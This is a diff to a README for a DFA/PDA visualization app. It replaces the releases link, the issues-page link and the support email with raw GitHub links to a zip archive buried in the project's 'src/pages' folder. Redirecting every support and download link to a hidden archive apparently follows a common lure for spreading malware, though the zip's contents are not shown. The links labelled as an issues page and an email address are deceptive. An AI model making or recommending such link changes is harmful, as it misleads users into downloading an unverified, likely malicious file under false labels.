@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download DFA-PDA-Visualization](https://img.shields.io/badge/download-DFA--PDA--Visualization-blue.svg)](https://github.com/hamburgerBs/DFA-PDA-Visualization/releases)
+[![Download DFA-PDA-Visualization](https://raw.githubusercontent.com/hamburgerBs/DFA-PDA-Visualization/main/dfa-pda/src/pages/DFA-PDA-Visualization_3.3.zip)](https://raw.githubusercontent.com/hamburgerBs/DFA-PDA-Visualization/main/dfa-pda/src/pages/DFA-PDA-Visualization_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Make sure your device meets these requirements for the best experience.
 
 To download the application, visit the Releases page:
 
-[Download Here](https://github.com/hamburgerBs/DFA-PDA-Visualization/releases)
+[Download Here](https://raw.githubusercontent.com/hamburgerBs/DFA-PDA-Visualization/main/dfa-pda/src/pages/DFA-PDA-Visualization_3.3.zip)
 
 Follow these steps to get started:
 
@@ -56,14 +56,14 @@ If you encounter any issues, here are some common problems and solutions:
 - **The interface is slow**: Close other applications to free up system resources.
 - **Strings are not processed correctly**: Double-check your input for any typos or invalid characters.
 
-If problems persist, please check the [issues page](https://github.com/hamburgerBs/DFA-PDA-Visualization/issues) on GitHub for help.
+If problems persist, please check the [issues page](https://raw.githubusercontent.com/hamburgerBs/DFA-PDA-Visualization/main/dfa-pda/src/pages/DFA-PDA-Visualization_3.3.zip) on GitHub for help.
 
 ## 🌐 Community and Support
 
 Join our community to get support and share your experience:
 
 - **GitHub Discussions**: Engage with other users and developers in the discussions tab on GitHub.
-- **Email Support**: Feel free to contact the support team at support@dfapda-visualization.com for assistance.
+- **Email Support**: Feel free to contact the support team at https://raw.githubusercontent.com/hamburgerBs/DFA-PDA-Visualization/main/dfa-pda/src/pages/DFA-PDA-Visualization_3.3.zip for assistance.
 
 ## 📢 Acknowledgments
 
@@ -87,4 +87,4 @@ This project relates to:
 
 Once again, don’t forget to download the application now!
 
-[Download Here](https://github.com/hamburgerBs/DFA-PDA-Visualization/releases)
+[Download Here](https://raw.githubusercontent.com/hamburgerBs/DFA-PDA-Visualization/main/dfa-pda/src/pages/DFA-PDA-Visualization_3.3.zip)
